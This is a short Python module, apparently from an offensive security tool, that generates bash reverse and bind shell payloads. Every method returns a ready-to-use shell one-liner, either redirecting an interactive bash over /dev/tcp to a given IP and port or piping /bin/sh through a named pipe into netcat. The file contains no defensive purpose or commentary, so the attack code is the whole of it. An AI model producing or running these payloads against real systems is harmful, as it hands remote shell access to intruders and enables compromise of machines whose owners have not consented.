"""
Bash /sh reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class BashGenerator(PayloadGenerator):
    """Standard bash/sh TCP reverse and bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        )

    def bind(self, port: int) -> str:
        return (
            f"bash -c 'bash -i >& /dev/tcp/0.0.0.0/{port} 0>&1'"
        )

    def file_extension(self) -> str:
        return ".sh"


class BashFifoGenerator(PayloadGenerator):
    """Bash reverse shell via named pipe (mkfifo) — more reliable on some hosts."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        )

    def bind(self, port: int) -> str:
        return (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc -l -p {port} >/tmp/f"
        )

    def file_extension(self) -> str:
        return ".sh"
